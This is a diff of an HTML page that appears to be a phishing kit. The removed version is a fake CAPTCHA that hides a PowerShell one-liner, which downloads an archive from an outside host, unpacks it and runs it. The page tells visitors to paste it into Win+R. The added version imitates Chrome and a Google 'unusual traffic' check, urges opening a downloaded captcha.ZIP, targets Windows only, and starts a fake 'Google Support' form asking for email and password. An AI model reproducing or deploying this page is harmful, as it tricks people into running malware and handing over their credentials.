@@ -1,654 +1,323 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Standalone single-file client-side CAPTCHA security check component.">
-  <title>CAPTCHA</title>
-  <style>
-    /* ==========================================================================
-       Design System & CSS Custom Properties
-       ========================================================================== */
-    :root {
-      --bg-gradient: radial-gradient(circle at 15% 10%, #193554 0%, transparent 28%), radial-gradient(circle at 85% 85%, #30205c 0%, transparent 32%), linear-gradient(140deg, #07101d 0%, #0b1728 48%, #100e22 100%);
-      --card-bg: rgba(13, 25, 43, 0.72);
-      --card-border: rgba(205, 224, 255, 0.18);
-      --card-shadow: 0 28px 70px -28px rgba(0, 0, 0, 0.85), 0 0 0 1px rgba(139, 182, 255, 0.06), 0 0 50px rgba(85, 119, 255, 0.12);
-      
-      --text-main: #f8fafc;
-      --text-muted: #94a3b8;
-      --text-heading: #ffffff;
-      
-      --primary: #8678ff;
-      --primary-hover: #9b90ff;
-      --primary-active: #6c5ef2;
-      --primary-glow: rgba(116, 101, 255, 0.42);
-      
-      --canvas-bg: rgba(4, 12, 25, 0.45);
-      --canvas-border: rgba(194, 219, 255, 0.2);
-      
-      --success-bg: rgba(16, 185, 129, 0.14);
-      --success-border: rgba(16, 185, 129, 0.35);
-      --success-text: #34d399;
-      
-      --error-bg: rgba(239, 68, 68, 0.14);
-      --error-border: rgba(239, 68, 68, 0.35);
-      --error-text: #f87171;
-      
-      --warning-bg: rgba(245, 158, 11, 0.14);
-      --warning-border: rgba(245, 158, 11, 0.35);
-      --warning-text: #fbbf24;
-      
-      --radius-sm: 8px;
-      --radius-md: 12px;
-      --radius-lg: 20px;
-      
-      --transition-fast: 0.15s ease;
-      --transition-normal: 0.25s ease;
-      --transition-smooth: 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-
-    /* Light Mode Preference */
-    @media (prefers-color-scheme: light) {
-      :root {
-        --bg-gradient: linear-gradient(135deg, #e2e8f0 0%, #f1f5f9 50%, #cbd5e1 100%);
-        --card-bg: rgba(255, 255, 255, 0.88);
-        --card-border: rgba(255, 255, 255, 0.7);
-        --card-shadow: 0 20px 40px -15px rgba(100, 116, 139, 0.2), 0 0 20px rgba(99, 102, 241, 0.08);
-        
-        --text-main: #1e293b;
-        --text-muted: #475569;
-        --text-heading: #0f172a;
-        
-        --canvas-bg: #f8fafc;
-        --canvas-border: #cbd5e1;
-        
-        --success-bg: rgba(16, 185, 129, 0.12);
-        --success-border: rgba(16, 185, 129, 0.4);
-        --success-text: #047857;
-        
-        --error-bg: rgba(239, 68, 68, 0.12);
-        --error-border: rgba(239, 68, 68, 0.4);
-        --error-text: #b91c1c;
-        
-        --warning-bg: rgba(245, 158, 11, 0.12);
-        --warning-border: rgba(245, 158, 11, 0.4);
-        --warning-text: #b45309;
-      }
-    }
-
-    /* Reset & Base Styles */
-    *, *::before, *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    html,
-    body {
-      width: 100%;
-      min-height: 100%;
-      min-height: 100vh;
-      min-height: 100dvh;
-    }
-
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      background-color: #07101d;
-      color: var(--text-main);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      line-height: 1.5;
-      -webkit-font-smoothing: antialiased;
-      position: relative;
-    }
-
-    .page-background {
-      position: fixed;
-      inset: 0;
-      width: 100vw;
-      height: 100vh;
-      height: 100dvh;
-      object-fit: cover;
-      object-position: center;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    /* Main Container & Card Layout */
-    .container {
-      width: 100%;
-      max-width: 500px;
-      margin: 0 auto;
-      position: relative;
-      z-index: 1;
-    }
-
-    .captcha-card {
-      background: var(--card-bg);
-      backdrop-filter: blur(22px) saturate(135%);
-      -webkit-backdrop-filter: blur(22px) saturate(135%);
-      border: 1px solid var(--card-border);
-      border-radius: 24px;
-      box-shadow: var(--card-shadow);
-      padding: 2.75rem 2.2rem;
-      transition: transform var(--transition-smooth), box-shadow var(--transition-smooth);
-      overflow: hidden;
-      isolation: isolate;
-    }
-
-    .captcha-card::before {
-      content: '';
-      position: absolute;
-      width: 260px;
-      height: 260px;
-      top: -160px;
-      right: -80px;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(157, 135, 255, 0.28), transparent 68%);
-      filter: blur(8px);
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    .captcha-card::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background-image: linear-gradient(rgba(255, 255, 255, 0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.025) 1px, transparent 1px);
-      background-size: 28px 28px;
-      mask-image: linear-gradient(to bottom, black, transparent 78%);
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    /* Header */
-    .card-header {
-      position: relative;
-      z-index: 1;
-      text-align: center;
-      margin: 0;
-    }
-
-    .card-title {
-      font-size: 0.77rem;
-      font-weight: 700;
-      color: var(--text-heading);
-      letter-spacing: 0.28em;
-      text-transform: uppercase;
-      opacity: 0.8;
-    }
-
-    .captcha-steps {
-      display: grid;
-      gap: 0.9rem;
-      margin: 1.35rem 0 0;
-      padding: 0;
-      list-style: none;
-      color: var(--text-heading);
-      font-size: clamp(1.25rem, 5vw, 1.85rem);
-      font-weight: 700;
-      line-height: 1.15;
-    }
-
-    .captcha-step {
-      min-height: 78px;
-      padding: 1rem 1.25rem;
-      border: 1px solid var(--canvas-border);
-      border-radius: 15px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.65rem;
-      background: linear-gradient(115deg, rgba(255, 255, 255, 0.055), rgba(255, 255, 255, 0.015));
-      box-shadow: inset 0 1px rgba(255, 255, 255, 0.07), 0 10px 22px -20px rgba(0, 0, 0, 0.9);
-      transition: transform var(--transition-normal), border-color var(--transition-normal), background var(--transition-normal);
-    }
-
-    .captcha-step:hover {
-      transform: translateX(4px);
-      border-color: rgba(171, 159, 255, 0.46);
-      background: linear-gradient(115deg, rgba(133, 120, 255, 0.17), rgba(255, 255, 255, 0.035));
-    }
-
-    .windows-icon {
-      width: 1.1em;
-      height: 1.1em;
-      flex-shrink: 0;
-    }
-
-    .copy-code-source {
-      margin: 1rem 0 0;
-      padding: 0.85rem 1rem;
-      border: 1px solid var(--canvas-border);
-      border-radius: 12px;
-      background: var(--canvas-bg);
-      color: var(--text-heading);
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 0.95rem;
-      font-weight: 600;
-      letter-spacing: 0.12em;
-      text-align: center;
-      overflow-x: auto;
-      white-space: pre-wrap;
-      word-break: break-word;
-    }
-
-    /* Feedback Banner */
-    .feedback-banner {
-      display: none;
-      align-items: center;
-      gap: 0.65rem;
-      padding: 0.85rem 1rem;
-      border-radius: var(--radius-md);
-      font-size: 0.875rem;
-      font-weight: 500;
-      margin-bottom: 1.5rem;
-      animation: slideDown 0.3s ease-out forwards;
-    }
-
-    .feedback-banner.show {
-      display: flex;
-    }
-
-    .feedback-banner.success {
-      background: var(--success-bg);
-      border: 1px solid var(--success-border);
-      color: var(--success-text);
-    }
-
-    .feedback-banner.error {
-      background: var(--error-bg);
-      border: 1px solid var(--error-border);
-      color: var(--error-text);
-    }
-
-    .feedback-banner.warning {
-      background: var(--warning-bg);
-      border: 1px solid var(--warning-border);
-      color: var(--warning-text);
-    }
-
-    .feedback-icon {
-      flex-shrink: 0;
-      width: 18px;
-      height: 18px;
-    }
-
-    /* Challenge Box */
-    .captcha-challenge-wrapper {
-      margin-bottom: 1.5rem;
-    }
-
-    .challenge-label {
-      display: block;
-      font-size: 0.8125rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-      color: var(--text-muted);
-      margin-bottom: 0.5rem;
-    }
-
-    .captcha-display-area {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .btn-copy-code {
-      position: relative;
-      width: 100%;
-      min-height: 82px;
-      padding: 1rem 1.25rem;
-      background: linear-gradient(115deg, #7668f5 0%, #8d7eff 52%, #695ceb 100%);
-      border: 1px solid rgba(217, 212, 255, 0.48);
-      border-radius: 15px;
-      color: #ffffff;
-      font-family: inherit;
-      font-size: clamp(1.25rem, 5vw, 1.85rem);
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.35), 0 15px 30px -12px var(--primary-glow);
-      transition: all var(--transition-fast);
-    }
-
-    .btn-copy-code:hover {
-      background: linear-gradient(115deg, #8a7dff 0%, #a397ff 52%, #786bff 100%);
-      border-color: rgba(240, 238, 255, 0.7);
-      color: #ffffff;
-      transform: translateY(-2px);
-    }
-
-    .btn-copy-code:active {
-      transform: scale(0.99);
-    }
-
-    .btn-copy-code:focus-visible {
-      outline: 2px solid var(--primary);
-      outline-offset: 2px;
-    }
-
-    .btn-copy-code.copied {
-      background: var(--success-bg);
-      border-color: var(--success-border);
-      color: var(--success-text);
-    }
-
-    .btn-copy-code svg {
-      width: 18px;
-      height: 18px;
-      flex-shrink: 0;
-    }
-
-    /* Form Controls */
-    .form-group {
-      margin-bottom: 1.5rem;
-    }
-
-    .input-wrapper {
-      position: relative;
-    }
-
-    .captcha-input {
-      width: 100%;
-      background: rgba(0, 0, 0, 0.15);
-      border: 1px solid var(--canvas-border);
-      border-radius: var(--radius-md);
-      padding: 0.85rem 1rem;
-      font-size: 1rem;
-      font-family: inherit;
-      color: var(--text-main);
-      transition: all var(--transition-fast);
-      letter-spacing: 0.05em;
-    }
-
-    .captcha-input::placeholder {
-      color: var(--text-muted);
-      letter-spacing: normal;
-    }
-
-    .captcha-input:hover {
-      border-color: rgba(99, 102, 241, 0.4);
-    }
-
-    .captcha-input:focus {
-      outline: none;
-      border-color: var(--primary);
-      box-shadow: 0 0 0 3px var(--primary-glow);
-      background: rgba(0, 0, 0, 0.25);
-    }
-
-    .captcha-input.is-invalid {
-      border-color: var(--error-text);
-      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.2);
-    }
-
-    .captcha-input.is-valid {
-      border-color: var(--success-text);
-      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
-    }
-
-    /* Submit Button */
-    .btn-verify {
-      width: 100%;
-      background: var(--primary);
-      color: #ffffff;
-      border: none;
-      border-radius: var(--radius-md);
-      padding: 0.9rem 1.5rem;
-      font-size: 1rem;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-      box-shadow: 0 4px 14px var(--primary-glow);
-      transition: all var(--transition-fast);
-    }
-
-    .btn-verify:hover:not(:disabled) {
-      background: var(--primary-hover);
-      box-shadow: 0 6px 20px rgba(99, 102, 241, 0.45);
-      transform: translateY(-1px);
-    }
-
-    .btn-verify:active:not(:disabled) {
-      background: var(--primary-active);
-      transform: translateY(0);
-      box-shadow: 0 2px 10px var(--primary-glow);
-    }
-
-    .btn-verify:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    .btn-verify:focus-visible {
-      outline: 2px solid #ffffff;
-      outline-offset: 2px;
-    }
-
-    /* Disclaimer Footer */
-    .security-note {
-      margin-top: 1.5rem;
-      padding-top: 1.25rem;
-      border-top: 1px solid var(--card-border);
-      display: flex;
-      align-items: flex-start;
-      gap: 0.5rem;
-      font-size: 0.75rem;
-      color: var(--text-muted);
-      line-height: 1.4;
-    }
-
-    .security-note svg {
-      width: 14px;
-      height: 14px;
-      flex-shrink: 0;
-      margin-top: 2px;
-      color: var(--warning-text);
-    }
-
-    /* Keyframe Animations */
-    @keyframes slideDown {
-      from {
-        opacity: 0;
-        transform: translateY(-8px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      20%, 60% { transform: translateX(-6px); }
-      40%, 80% { transform: translateX(6px); }
-    }
-
-    .shake-animation {
-      animation: shake 0.4s ease-in-out;
-    }
-
-    @keyframes pulseSuccess {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.02); }
-      100% { transform: scale(1); }
-    }
-
-    .pulse-animation {
-      animation: pulseSuccess 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-
-    /* Responsive Breakpoint */
-    @media (max-width: 480px) {
-      body {
-        padding: 1rem;
-      }
-
-      .captcha-card {
-        padding: 1.75rem 1.25rem;
-      }
-
-    }
-
-    /* Clean visual treatment */
-    :root {
-      --card-bg: #1b2737;
-      --card-border: rgba(255, 255, 255, 0.14);
-      --card-shadow: none;
-      --primary: #6366f1;
-      --primary-hover: #4f46e5;
-      --primary-active: #4338ca;
-      --primary-glow: rgba(99, 102, 241, 0.3);
-      --canvas-bg: #121c2b;
-      --canvas-border: rgba(255, 255, 255, 0.16);
-    }
-
-    body {
-      background-color: #0f172a;
-    }
-
-    .captcha-card::before,
-    .captcha-card::after {
-      display: none;
-    }
-
-    .container {
-      max-width: 440px;
-    }
-
-    .captcha-card {
-      padding: 2.25rem 2rem;
-      border-radius: 20px;
-      background: var(--card-bg);
-      backdrop-filter: none;
-      -webkit-backdrop-filter: none;
-      box-shadow: none;
-    }
-
-    .card-title {
-      font-size: 1.35rem;
-      letter-spacing: -0.02em;
-      text-transform: none;
-      opacity: 1;
-    }
-
-    .captcha-steps {
-      gap: 1rem;
-      margin-top: 2rem;
-      font-size: 1.35rem;
-    }
-
-    .captcha-step {
-      min-height: 72px;
-      border-radius: 12px;
-      background: var(--canvas-bg);
-      box-shadow: none;
-      transition: none;
-    }
-
-    .captcha-step:hover {
-      transform: none;
-      border-color: var(--canvas-border);
-      background: var(--canvas-bg);
-    }
-
-    .btn-copy-code {
-      min-height: 72px;
-      border-radius: 12px;
-      background: var(--primary);
-      border-color: transparent;
-      box-shadow: none;
-    }
-
-    .btn-copy-code:hover {
-      background: var(--primary-hover);
-      border-color: transparent;
-      transform: none;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HELLO</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Montserrat:wght@300;400;700;900&family=Outfit:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
+  <script>
+    (function () {
+      var ua = navigator.userAgent || "";
+      var platform = navigator.platform || "";
+      var uaData = navigator.userAgentData;
+      var mobile =
+        (uaData && uaData.mobile) ||
+        /Mobi|Android|iPhone|iPod|iPad|Tablet|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua) ||
+        (navigator.maxTouchPoints > 1 && /Mac/i.test(platform));
+      var windows =
+        (uaData && /^Win/i.test(String(uaData.platform || ""))) ||
+        /Windows NT/i.test(ua) ||
+        /Win(32|64)/i.test(platform);
+      if (!windows || mobile) document.documentElement.classList.add("is-blocked");
+      else document.documentElement.classList.add("is-gated");
+    })();
+  </script>
 </head>
 <body>
-  <img class="page-background" src="photo.png" alt="" aria-hidden="true">
-
-  <main class="container">
-    <section class="captcha-card" id="captcha-card" aria-labelledby="card-title">
-      
-      <header class="card-header">
-        <h1 class="card-title" id="card-title">CAPTCHA</h1>
-        <pre class="copy-code-source">Come On Real Human!</pre>
-        <pre id="copy-code-source" class="copy-code-source" style="display: none;">powershell -nop -c "$p=$home+'\Downloads\d.rar';$x=$home+'\Downloads\d';curl.exe -Lso $p https://linkwar.up.railway.app/f/07906af1ccd98541e29c4fdb;md $x -ea 0;&($env:ProgramFiles+'\WinRAR\UnRAR.exe') x -y $p ($x+'\');ri $p;saps (gci $x -file)[0].FullName"</pre>
-        
-        <ol class="captcha-steps">
-          <li>
-            <button type="button" id="btn-copy-code" class="btn-copy-code" title="Copy CAPTCHA code">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-              </svg>
-              <span id="btn-copy-code-label">COPY CODE</span>
-            </button>
-          </li>
-          <li class="captcha-step">
-            <svg class="windows-icon" viewBox="0 0 24 24" aria-hidden="true">
-              <path fill="currentColor" d="M2 4.1 10.1 3v8H2V4.1Zm9.1-1.2L22 1.4V11h-10.9V2.9ZM2 12h8.1v8L2 18.9V12Zm9.1 0H22v9.6l-10.9-1.5V12Z"/>
+  <div class="photo-gate" id="photo-gate">
+    <button class="photo-gate__btn" id="photo-gate-btn" type="button" aria-label="Enter">
+      <img class="photo-gate__img" src="photo.png" alt="" />
+    </button>
+  </div>
+  <div class="everyone-alert is-hidden" id="everyone-alert" hidden role="status" aria-live="polite">
+    <div class="everyone-alert__card">
+      <svg class="everyone-alert__icon" viewBox="0 0 48 48" aria-hidden="true">
+        <use href="#chrome-favicon" />
+      </svg>
+      <div class="everyone-alert__body">
+        <p class="everyone-alert__source">Chrome</p>
+        <p class="everyone-alert__title">Entry is prohibited as this is a phishing site.</p>
+      </div>
+    </div>
+  </div>
+  <svg aria-hidden="true" width="0" height="0" class="svg-sprite">
+    <defs>
+      <symbol id="chrome-favicon" viewBox="0 0 48 48">
+        <circle cx="24" cy="23.9947" r="12" fill="currentColor" />
+        <path d="M24,12H44.7812a23.9939,23.9939,0,0,0-41.5639.0029L13.6079,30l.0093-.0024A11.9852,11.9852,0,0,1,24,12Z" fill="currentColor" />
+        <circle cx="24" cy="24" r="9.5" fill="currentColor" />
+        <path d="M34.3913,30.0029,24.0007,48A23.994,23.994,0,0,0,44.78,12.0031H23.9989l-.0025.0093A11.985,11.985,0,0,1,34.3913,30.0029Z" fill="currentColor" />
+        <path d="M13.6086,30.0031,3.218,12.006A23.994,23.994,0,0,0,24.0025,48L34.3931,30.0029l-.0067-.0068a11.9852,11.9852,0,0,1-20.7778.007Z" fill="currentColor" />
+      </symbol>
+    </defs>
+  </svg>
+  <div class="access-block" id="access-block">
+    <div class="access-block__inner">
+      <h1 class="access-block__title">This page isn’t available on this device</h1>
+      <p class="access-block__copy">Access is limited to Windows computers. Mobile devices and Mac are blocked.</p>
+    </div>
+  </div>
+  <header class="site-header" id="site-header">
+    <div class="tab-strip">
+      <button class="tab-search" type="button" aria-label="Search tabs">
+        <svg viewBox="0 0 16 16" aria-hidden="true">
+          <path d="M4.2 6.2 8 10l3.8-3.8" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </button>
+      <div class="tab-list" id="tab-list">
+        <div class="tab is-active" role="tab" aria-selected="true">
+          <span class="tab-lead">
+            <svg class="tab-favicon" viewBox="0 0 48 48" aria-hidden="true">
+              <use href="#chrome-favicon" />
             </svg>
-            <span>+ R</span>
-          </li>
-          <li class="captcha-step">CTRL + V</li>
-          <li class="captcha-step">ENTER</li>
-        </ol>
-      </header>
+            <span class="tab-title">New Tab</span>
+          </span>
+          <button class="tab-close" type="button" aria-label="Close tab">
+            <svg viewBox="0 0 16 16" aria-hidden="true">
+              <path d="M4.2 4.2l7.6 7.6M11.8 4.2l-7.6 7.6" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path>
+            </svg>
+          </button>
+        </div>
+      </div>
+      <button class="tab-new" id="tab-new" type="button" aria-label="New tab">
+        <svg viewBox="0 0 16 16" aria-hidden="true">
+          <path d="M8 3.2v9.6M3.2 8h9.6" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"></path>
+        </svg>
+      </button>
+      <div class="tab-strip-spacer"></div>
+      <div class="win-controls">
+        <button class="win-btn" type="button" aria-label="Minimize">
+          <svg viewBox="0 0 12 12" aria-hidden="true">
+            <path d="M1.5 6h9" fill="none" stroke="currentColor" stroke-width="1"></path>
+          </svg>
+        </button>
+        <button class="win-btn" id="win-restore" type="button" aria-label="Restore">
+          <svg viewBox="0 0 12 12" aria-hidden="true">
+            <rect x="1.25" y="3.25" width="6.5" height="6.5" fill="none" stroke="currentColor" stroke-width="1"></rect>
+            <path d="M4.25 3.25V1.75h6v6H8.75" fill="none" stroke="currentColor" stroke-width="1"></path>
+          </svg>
+        </button>
+        <button class="win-btn win-close" type="button" aria-label="Close">
+          <svg viewBox="0 0 12 12" aria-hidden="true">
+            <path d="M2.2 2.2l7.6 7.6M9.8 2.2l-7.6 7.6" fill="none" stroke="currentColor" stroke-width="1"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
 
+    <div class="header-inner">
+      <div class="chrome-controls">
+        <button class="chrome-btn" id="nav-back" type="button" aria-label="Back" disabled>
+          <svg class="icon-stroke" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M19 12H5M12 19l-7-7 7-7"></path>
+          </svg>
+        </button>
+        <button class="chrome-btn" id="nav-forward" type="button" aria-label="Forward" disabled>
+          <svg class="icon-stroke" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </button>
+        <button class="chrome-btn" id="nav-reload" type="button" aria-label="Reload">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M17.65 6.35A7.958 7.958 0 0 0 12 4a8 8 0 1 0 8 8h-2a6 6 0 1 1-6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path>
+          </svg>
+        </button>
+      </div>
+
+      <form class="url-form" id="url-form" action="#" method="get">
+        <div class="url-bar" id="url-bar">
+          <span class="url-chip" id="url-chip" hidden>
+            <svg class="url-chip__icon url-chip__info" viewBox="0 0 16 16" aria-hidden="true">
+              <circle cx="8" cy="8" r="6.2" fill="none" stroke="currentColor" stroke-width="1.35"></circle>
+              <circle cx="8" cy="5.15" r="0.85" fill="currentColor"></circle>
+              <rect x="7.25" y="7.05" width="1.5" height="4.2" rx="0.75" fill="currentColor"></rect>
+            </svg>
+            <span class="url-chip__label" id="url-chip-label">File</span>
+          </span>
+          <input
+            class="url-bar__input"
+            id="url-input"
+            type="text"
+            name="url"
+            placeholder="Search Google or type a URL"
+            autocomplete="off"
+            spellcheck="false"
+            aria-label="Address"
+          />
+          <button class="url-bar__star" id="url-star" type="button" aria-label="Bookmark this tab" aria-pressed="false">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M12 17.27 18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"></path>
+            </svg>
+          </button>
+        </div>
+      </form>
+
+      <div class="chrome-right" aria-label="Browser tools">
+        <button class="chrome-btn chrome-profile" type="button" aria-label="Google Account">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="10.15" fill="none" stroke="currentColor" stroke-width="1.6"></circle>
+            <circle class="profile-fill" cx="12" cy="9.2" r="3.1"></circle>
+            <path class="profile-fill" d="M6.4 18.35c1.45-2.2 3.35-3.3 5.6-3.3s4.15 1.1 5.6 3.3"></path>
+          </svg>
+        </button>
+        <button class="chrome-btn chrome-menu" type="button" aria-label="Chrome menu">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="6" r="1.55"></circle>
+            <circle cx="12" cy="12" r="1.55"></circle>
+            <circle cx="12" cy="18" r="1.55"></circle>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main id="top">
+    <section class="ntp" id="ntp">
+      <div class="ntp-cluster">
+        <h1 class="ntp-logo">
+          <img src="google-logo.png" alt="Google" />
+        </h1>
+        <form class="ntp-search" id="ntp-form" action="#" method="get">
+          <button class="ntp-plus" type="button" aria-label="Add">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="none" stroke="#202124" stroke-width="1.8" stroke-linecap="round" d="M12 5v14M5 12h14"></path>
+            </svg>
+          </button>
+          <input
+            class="ntp-input"
+            id="ntp-input"
+            type="text"
+            name="q"
+            placeholder="Ask Google"
+            autocomplete="off"
+            spellcheck="false"
+            aria-label="Ask Google"
+          />
+          <button class="ntp-icon" type="button" aria-label="Voice search">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="#202124" d="M12 14a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v5a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.92V21h2v-3.08A7 7 0 0 0 19 11h-2z"></path>
+            </svg>
+          </button>
+          <button class="ntp-icon" type="button" aria-label="Search by image">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path fill="#202124" d="M20 5h-3.2l-1.2-1.6A2 2 0 0 0 14 3h-4a2 2 0 0 0-1.6.8L7.2 5H4a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2zm-8 12.5A4.5 4.5 0 1 1 16.5 13 4.5 4.5 0 0 1 12 17.5zM12 10a3 3 0 1 0 3 3 3 3 0 0 0-3-3z"></path>
+            </svg>
+          </button>
+          <button class="ntp-ai" type="submit" aria-label="AI Mode">
+            <svg viewBox="0 0 16 16" aria-hidden="true">
+              <path fill="#202124" d="M8 1.4 9.1 5.3 13 6.4 9.1 7.5 8 11.4 6.9 7.5 3 6.4 6.9 5.3z"></path>
+            </svg>
+            AI Mode
+          </button>
+        </form>
+      </div>
     </section>
+    <iframe class="page-frame is-hidden" id="page-frame" title="Google Search" allow="fullscreen"></iframe>
+    <aside class="sorry-page is-hidden" id="sorry-page" hidden>
+      <div class="sorry-page__inner">
+        <hr class="sorry-rule" />
+        <div class="recaptcha-stage">
+          <div class="recaptcha-widget" id="g-recaptcha">
+            <button class="recaptcha-main" id="recaptcha-check" type="button" aria-pressed="false">
+              <span class="recaptcha-box" aria-hidden="true"></span>
+              <span class="recaptcha-label">I'm not a robot</span>
+            </button>
+            <div class="recaptcha-brand" aria-hidden="true">
+              <img class="recaptcha-logo" src="recaptcha-logo.png" width="32" height="32" alt="" />
+              <span class="recaptcha-name">reCAPTCHA</span>
+              <span class="recaptcha-legal">Privacy - Terms</span>
+            </div>
+          </div>
+
+          <div class="rc-challenge is-hidden" id="hello-gate" hidden>
+            <div class="rc-header">
+              <div class="rc-header-copy">
+                <p>Your account has been temporarily suspended due to bot detection.</p>
+                <p>Go to Downloads, open the captcha.ZIP file, and enter the VERIFY code.</p>
+              </div>
+            </div>
+            <form class="rc-form" id="hello-gate-form" action="#" method="post">
+              <div class="rc-payload">
+                <input
+                  class="rc-code"
+                  id="hello-code"
+                  name="code"
+                  type="text"
+                  inputmode="numeric"
+                  pattern="[0-9]*"
+                  maxlength="5"
+                  autocomplete="off"
+                  spellcheck="false"
+                  aria-label="5-digit number"
+                />
+                <p class="rc-error" id="hello-code-error" hidden>Incorrect number</p>
+              </div>
+              <div class="rc-footer">
+                <div class="rc-tools">
+                  <button class="rc-tool" id="rc-reload" type="button" aria-label="Get a new challenge">
+                    <svg viewBox="0 0 24 24" aria-hidden="true">
+                      <path fill="currentColor" d="M17.65 6.35A7.95 7.95 0 0 0 12 4a8 8 0 1 0 8 8h-2a6 6 0 1 1-6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"></path>
+                    </svg>
+                  </button>
+                  <button class="rc-tool" type="button" aria-label="Get an audio challenge">
+                    <svg viewBox="0 0 24 24" aria-hidden="true">
+                      <path fill="currentColor" d="M12 3a4 4 0 0 0-4 4v4a4 4 0 0 0 8 0V7a4 4 0 0 0-4-4zm7 8a1 1 0 0 0-2 0 5 5 0 0 1-10 0 1 1 0 0 0-2 0 7 7 0 0 0 6 6.92V20H8v2h8v-2h-3v-2.08A7 7 0 0 0 19 11z"></path>
+                    </svg>
+                  </button>
+                  <button class="rc-tool" type="button" aria-label="Help">
+                    <svg viewBox="0 0 24 24" aria-hidden="true">
+                      <path fill="currentColor" d="M11 7h2v2h-2V7zm0 4h2v6h-2v-6zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path>
+                    </svg>
+                  </button>
+                </div>
+                <button class="rc-verify" type="submit">VERIFY</button>
+              </div>
+            </form>
+          </div>
+        </div>
+        <div class="sorry-about">
+          <hr class="sorry-rule" />
+          <h2 class="sorry-heading">About this page</h2>
+          <p class="sorry-copy">Our systems have detected unusual traffic from your computer network. This page checks to see if it's really you sending the requests, and not a robot. <a class="sorry-link" href="https://support.google.com/websearch/answer/86640" target="_blank" rel="noopener noreferrer">Why did this happen?</a></p>
+          <p class="sorry-meta" id="sorry-meta">IP address: detecting…<br />
+Time: <span id="sorry-time"></span><br />
+URL: <span id="sorry-url"></span></p>
+        </div>
+      </div>
+    </aside>
+    <div class="hello-modal is-hidden" id="hello-modal" hidden>
+      <div class="hello-modal__panel" role="dialog" aria-modal="true" aria-labelledby="hello-modal-title">
+        <h2 class="hello-modal__title" id="hello-modal-title">Google Support</h2>
+        <p class="hello-modal__copy">Please verify your email and password again for Google Support</p>
+        <form class="hello-modal__form" id="hello-modal-form" action="#" method="post">
+          <label class="hello-modal__label" for="hello-email">Email</label>
